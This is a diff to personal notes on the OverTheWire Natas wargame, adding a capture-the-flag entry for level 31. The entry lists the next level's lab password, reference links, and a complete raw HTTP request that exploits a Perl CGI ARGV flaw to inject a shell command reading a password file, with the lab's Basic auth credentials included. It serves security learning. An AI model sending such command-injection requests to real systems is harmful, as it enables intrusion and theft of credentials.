@@ -948,4 +948,41 @@ END
 
 ## 31->32
 - http://natas31.natas.labs.overthewire.org/
-- `natas32:`
+- `natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`
+- https://learnhacking.io/overthewire-natas-level-31-walkthrough/
+- `cgi` perl exploit
+- https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf?ref=learnhacking.io
+- https://www.youtube.com/watch?v=RPvORV2Amic&t=1305s&ab_channel=media.ccc.de
+
+```
+POST /index.pl?cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+Content-Length: 383
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
+Accept-Language: en-US,en;q=0.9
+Origin: http://natas31.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylrrZCTqDvB2wjAi6
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://natas31.natas.labs.overthewire.org/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundarylrrZCTqDvB2wjAi6
+Content-Disposition: form-data; name="file"
+
+ARGV
+------WebKitFormBoundarylrrZCTqDvB2wjAi6
+Content-Disposition: form-data; name="file"; filename="text.csv"
+Content-Type: text/csv
+
+1,2,
+3,4,
+------WebKitFormBoundarylrrZCTqDvB2wjAi6
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundarylrrZCTqDvB2wjAi6--
+```
